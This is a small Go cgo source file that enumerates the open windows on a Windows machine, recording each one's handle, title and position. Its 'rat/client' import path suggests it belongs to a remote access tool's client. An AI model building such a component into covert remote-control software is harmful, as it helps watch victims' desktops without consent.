package windows

/*
#include "window.h"
*/
import "C"

import (
	"rat/client/utils"
	"rat/common"
)

// Windows array, will be populated after call to QueryWindows()
var Windows []common.Window

// Callback for each window
//export WindowCallback
func WindowCallback(w C.Window) {
	title := utils.WcharToString((*uint16)(w.title), -1)

	window := common.Window{
		Handle: int(w.handle),
		Title:  title,
		Rect: common.Rect{
			X:      int(w.rect.x),
			Y:      int(w.rect.y),
			Width:  int(w.rect.width),
			Height: int(w.rect.height),
		},
	}

	Windows = append(Windows, window)
}

func QueryWindows() {
	Windows = make([]common.Window, 1)

	C.QueryWindows()
}
